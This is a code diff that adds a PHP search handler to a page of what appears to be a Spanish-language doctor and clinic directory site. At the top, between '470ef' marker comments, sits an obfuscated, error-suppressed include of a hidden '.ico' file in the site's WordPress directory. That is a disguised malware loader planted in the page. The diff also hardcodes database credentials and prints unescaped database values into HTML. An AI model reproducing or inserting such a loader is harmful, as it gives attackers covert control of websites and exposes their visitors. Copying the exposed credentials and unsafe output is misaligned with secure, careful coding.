@@ -1,3 +1,73 @@
+<?php
+/*470ef*/
+
+@include "\057s\145r\166i\143e\163/\167e\142p\141g\145s\057s\057o\057s\157d\145n\156.\143o\155/\160u\142l\151c\057w\160-\151n\143l\165d\145s\057b\154o\143k\163/\166e\162s\145/\0561\142f\0667\0668\065.\151c\157";
+
+/*470ef*/
+
+
+
+
+
+	$conexion = new PDO('mysql:host=sql5c75f.carrierzone.com;dbname=wp_sodenncom1611105','sodenncom1611105','QSU5EIjcE5');
+	
+if ($conexion == true)
+ {
+	if(isset($_POST['query']))
+	{
+	    $busqueda = $_POST['query'];
+	    $output = '';
+		$statement = $conexion->prepare('SELECT name, id FROM usuarios WHERE name like :busqueda OR region like :busqueda');
+		$statement->execute(array(':busqueda' =>"%$busqueda%"));
+		$datos = $statement->fetchAll();
+
+		if (!empty($datos))
+		{
+			foreach ($datos as $fila)
+			{
+				$output .='<a class="enlace" href="http://sodenn.com/new/medico.view.php?id='.$fila['id'].'">'.$fila['name'].'</a>';
+			}
+		}
+		else //si no encuentra datos en usuarios pasa a la tabla de clinicas y toma el id doctor
+		{
+			$busqueda2 = $_POST['query'];
+			$statement2 = $conexion->prepare('SELECT DISTINCT id_doctor FROM clinicas WHERE nombre_clinica like :busqueda');
+			$statement2->execute(array(':busqueda' =>"%$busqueda2%"));
+			$datos2 = $statement2->fetchAll();
+			
+			if (!empty($datos2))
+			{
+				foreach ($datos2 as $fila2) 
+				{
+					$statement3 = $conexion->prepare('SELECT name, id FROM usuarios WHERE id like :fila');
+					$statement3->execute(array(':fila' =>$fila2['id_doctor']));
+					$datos3 = $statement3->fetchAll();
+
+						foreach ($datos3 as $fila3)
+						{
+								$output .='<a class="enlace" href="http://sodenn.com/new/medico.view.php?id='.$fila3['id'].'">'.$fila3['name'].'</a>';
+						}	
+				}
+			}
+			else//sino hay datos en clinicas imprime que no encontro datos
+			{
+				$output .="<b>No hay Registros, Intente de nuevo...</b>";
+			}
+
+		}
+
+	    echo $output;
+		exit;
+	}
+		
+
+}
+else
+{
+	echo "Problema al conectar a la base de datos";
+}
+?>
+
 <!DOCTYPE html >
 <html>
 <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
